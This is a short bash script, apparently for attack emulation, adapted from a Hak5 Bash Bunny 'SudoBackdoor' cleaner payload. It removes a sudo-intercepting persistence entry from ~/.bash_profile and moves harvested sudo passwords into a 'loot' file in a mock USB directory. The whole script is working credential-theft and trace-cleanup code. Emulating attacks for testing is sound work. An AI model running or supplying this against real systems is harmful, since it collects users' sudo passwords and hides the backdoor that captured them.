#!/bin/bash
# inspired by: https://github.com/hak5/bashbunny-payloads/blob/27d63ad5a535510b20787cc03850b28bbdb727ee/payloads/library/credentials/SudoBackdoor/cleaner/payload.txt

# Move sudo passwords to mock Bash Bunny device
# Clean up persistence mechanism in .bash_profile

# Create mock Bash Bunny USB drive directory
MOCK_BASH_BUNNY_USB_DIR=$HOME/bash_bunny
PAYLOAD_DIR=$MOCK_BASH_BUNNY_USB_DIR/payloads/SudoBackdoor/injector
LOOT_DIR=$MOCK_BASH_BUNNY_USB_DIR/loot/SudoBackdoor
LOOT_FILE=$LOOT_DIR/loot.txt
mkdir -p $MOCK_BASH_BUNNY_USB_DIR $PAYLOAD_DIR $LOOT_DIR

sed -i 's/~\/\.config\/sudo://g' ~/.bash_profile
mv --force ~/.config/sudo/sudo.config $LOOT_FILE